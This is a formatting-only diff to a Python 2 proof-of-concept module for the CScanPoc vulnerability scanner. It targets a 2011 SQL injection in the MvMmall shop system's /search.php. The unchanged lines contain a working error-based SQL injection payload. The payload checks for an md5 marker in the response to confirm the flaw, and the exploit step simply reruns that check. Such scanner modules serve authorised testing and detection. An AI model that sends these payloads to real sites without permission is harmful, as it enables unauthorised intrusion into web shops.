@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'MvMmall_0001' # 平台漏洞编号，留空
+    vuln_id = 'MvMmall_0001'  # 平台漏洞编号，留空
     name = 'MvMmall 网店商城系统 /search.php SQL注入漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2011-03-27'  # 漏洞公布时间
     desc = '''
         MvMmall网店商城系统最新注入0day问题出在搜索search.php这个文件上。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'MvMmall'  # 漏洞应用名称
     product_version = 'MvMmall网店商城系统'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '251af4e4-e6e1-4626-8020-525b78eff4dc'
@@ -31,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = ("/search.php?tag_ids[goods_id]=uid))%20and(select%201%20from"
                        "(select%20count(*),concat((select%20(select%20md5(12345))%20"
                        "from%20information_schema.tables%20limit%200,1),floor(rand(0)"
@@ -41,14 +43,15 @@ class Poc(ABPoc):
             req = urllib2.Request(verify_url)
             content = urllib2.urlopen(req).read()
             if '827ccb0eea8a706c4c34a16891f84e7b' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
